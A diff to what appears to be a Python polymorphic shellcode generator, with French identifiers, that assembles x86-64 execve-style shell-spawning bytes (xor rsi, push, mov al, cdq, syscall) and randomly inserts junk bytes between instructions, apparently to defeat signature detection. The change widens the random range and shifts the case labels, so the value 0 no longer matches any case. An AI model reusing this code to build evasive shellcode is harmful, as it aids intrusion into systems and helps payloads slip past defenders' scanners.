@@ -19,21 +19,21 @@ def partie6():
     syscall = "\\x0f\\x05"
 
     resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
-    y = random.randint(0, 4)
+    y = random.randint(0, 5)
 
     match y : 
-        case 0 :
+        case 1 :
             resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
-        case 1 : 
+        case 2 : 
             print("1")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
-        case 2 :
+        case 3 :
             print("2")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
-        case 3 :
+        case 4 :
             print("3")
             resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + full_random() +cdq + syscall
-        case 4 :
+        case 5 :
             print("4")
             resultat_concat = xorrsi + full_random() + pushrsi + full_random() + movrdi + full_random() + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
 
